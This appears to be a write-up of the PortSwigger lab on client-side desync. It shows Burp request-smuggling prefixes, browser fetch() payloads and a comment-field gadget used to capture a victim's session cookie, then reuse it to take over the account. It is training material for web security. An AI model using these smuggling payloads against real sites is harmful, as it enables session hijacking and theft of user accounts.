#  Lab: Client-side desync

## 📌 Lab Details
- **Title**: Lab: Client-side desync
- **Difficulty**: Expert
- **Category**: HTTP Request Smuggling
- **Lab URL**: https://portswigger.net/academy/labs/launch/c7e1e3ecc45431f9694ade69d2c269fdfedcff87aa2cb4525dd503090d7d467e?referrer=%2fweb-security%2frequest-smuggling%2fbrowser%2fclient-side-desync%2flab-client-side-desync

## 🔍 Summary
Client-side desync is a request-smuggling variant where a server (or proxy) ignores `Content-Length`, letting attacker-supplied bytes inside a browser POST be parsed as a second HTTP request. In the lab you confirm the desync in Burp, reproduce it from a real browser with `fetch()`, use the comment feature as a gadget to store leaked request text, exfiltrate a victim’s `session` cookie, and reuse that cookie to access the victim account.

## 🛠 Steps to Solve
**Identify a vulnerable endpoint**
1. Send the `GET /` request to Burp Repeater.
2. Disable the **Update Content-Length** option in the tab-specific settings.
3. Change the request method to **POST**.
4. Change the `Content-Length` to 1 or higher and leave the body empty.
5. Send the request. Observe that the server responds immediately rather than waiting for the body. This suggests that it is ignoring the specified `Content-Length`.

**Confirm the desync vector in Burp**
1. Re-enable the **Update Content-Length** option.
2. Add an arbitrary request smuggling prefix to the body:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.h1-web-security-academy.net
   Connection: close
   Content-Length: CORRECT

   GET /hopefully404 HTTP/1.1
   Foo: x
   ```
3. Add a normal request for `GET /` to the tab group, after your malicious request.
4. Change the **send** method to **send group in sequence**(single connection).
5. Change the `Connection` header of the first request to `keep-alive`.
6. Send the sequence and check the responses. If the response to the second request matches what you expected from the smuggled prefix (in this case, a 404 response), this confirms that you can cause a desync.

**Replicate the desync vector in your browser**
1. Open a separate instance of Chrome that is **not** proxying traffic through Burp.
2. Go to the exploit server.
3. Open the browser developer tools and go to the **Network** tab.
4. Ensure that the **Preserve log** option is selected and clear the log of any existing entries.
5. Go to the **Console tab** and replicate the attack from the previous section using the `fetch()` API as follows:
   ```sh
   fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
    mode: 'cors',
    credentials: 'include',
    }).catch(() => {
        fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
        mode: 'no-cors',
        credentials: 'include'
    })
    })
   ```
   Note that we're intentionally triggering a CORS error to prevent the browser from following the redirect, then using the **catch()** method to continue the attack sequence.
6. On the Network tab, you should see two requests:
   - The main request, which has triggered a CORS error.
   - A request for the home page, which received a 404 response.
   This confirms that the desync vector can be triggered from a browser.

**Identify an exploitable gadget**
1. Back in Burp's browser, visit one of the blog posts and observe that this lab contains a comment function.
2. From the **Proxy > HTTP history**, find the `GET /en/post?postId=x` request. Make note of the following:
   - The `postId` from the query string.
   - Your `session` and `_lab_analytics` cookies.
   - The `csrf` token.
3. In Burp Repeater, use the desync vector from the previous section to try to capture your own arbitrary request in a comment. For example:<br>
   **Request 1:**
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.h1-web-security-academy.net
   Connection: keep-alive
   Content-Length: CORRECT

   POST /en/post/comment HTTP/1.1
   Host: YOUR-LAB-ID.h1-web-security-academy.net
   Cookie: session=YOUR-SESSION-COOKIE; _lab_analytics=YOUR-LAB-COOKIE
   Content-Length: NUMBER-OF-BYTES-TO-CAPTURE
   Content-Type: x-www-form-urlencoded
   Connection: keep-alive

   csrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://ginandjuice.shop&comment=
   ```
   **Request 2:** Send a normal `GET /` request.
   
   Note that the number of bytes that you try to capture must be longer than the body of your `POST /en/post/comment` request prefix, but shorter than the follow-up request.
4. Back in the browser, refresh the blog post and confirm that you have successfully output the start of your GET /capture-me request in a comment.

**Replicate the attack in your browser**
1. Open a separate instance of Chrome that is not proxying traffic through Burp.
2. Go to the exploit server.
3. Open the browser developer tools and go to the Network tab.
4. Ensure that the **Preserve log** option is selected and clear the log of any existing entries.
5. Go to the Console tab and replicate the attack from the previous section using the fetch() API as follows:
   ```sh
   fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
        method: 'POST',
        body: 'POST /en/post/comment HTTP/1.1\r\nHost: YOUR-LAB-ID.h1-web-security-academy.net\r\nCookie: session=YOUR-SESSION-COOKIE; _lab_analytics=YOUR-LAB-COOKIE\r\nContent-Length: NUMBER-OF-BYTES-TO-CAPTURE\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://portswigger.net&comment=',
        mode: 'cors',
        credentials: 'include',
    }).catch(() => {
        fetch('https://YOUR-LAB-ID.h1-web-security-academy.net/capture-me', {
        mode: 'no-cors',
        credentials: 'include'
    })
    })
   ```
6. On the Network tab, you should see three requests:
   - The initial request, which has triggered a CORS error.
   - A request for `/capture-me`, which has been redirected to the post confirmation page.
   - A request to load the post confirmation page.
7. Refresh the blog post and confirm that you have successfully output the start of your own `/capture-me` request via a browser-initiated attack.   

**Exploit**
1. Go to the exploit server.
2. In the **Body** panel, paste the script that you tested in the previous section.
3. Wrap the entire script in HTML <script> tags.
4. Store the exploit and click Deliver to victim.
5. Refresh the blog post and confirm that you have captured the start of the victim user's request.
6. Repeat this attack, adjusting the `Content-Length` of the nested `POST /en/post/comment` request until you have successfully output the victim's session cookie.
7. In Burp Repeater, send a request for `/my-account` using the victim's stolen cookie to solve the lab.

## 📖 Key Takeaways
- **Desync vector**: If front-end and back-end disagree about message boundaries (e.g., server ignores `Content-Length`), attacker-controlled payloads inside a POST body can be parsed as a new request.
- **Client-side trigger**: Modern browsers can be induced to send those bytes using `fetch()` (or similar) so the attack is executed from the victim’s browser — no direct server-side exploit needed.
- **Tight tuning**: The success depends on carefully chosen `Content-Length` values (capture size must be > your nested body prefix but < follow-up request size). Iteration is normal.
- **Impact**: Stolen session cookies let the attacker hijack the victim’s account without needing traditional XSS or CSRF.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c5a99f5a-0a89-4095-8b0d-99158fe71c6f" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3d5dfd4b-3435-4f95-9235-ac4c82a7a2b8" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4ec5e981-5074-4628-b26b-36cd97a4ede0" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/21ee97c6-a6e9-47f1-8220-059e955f6e71" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c77cb84b-9741-4042-8c96-390fd099a165" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/57035128-0896-4196-93c4-0c9e34c12b27" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/312d8925-c9aa-4d74-a453-33b5c6fa49b2" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/6530c189-0258-4906-b049-0bccdf452b3a" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/bd028193-1029-4b44-83ce-82bb72bd35bf" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a0610c3c-e769-4e70-a5f5-e4c7b0212563" />
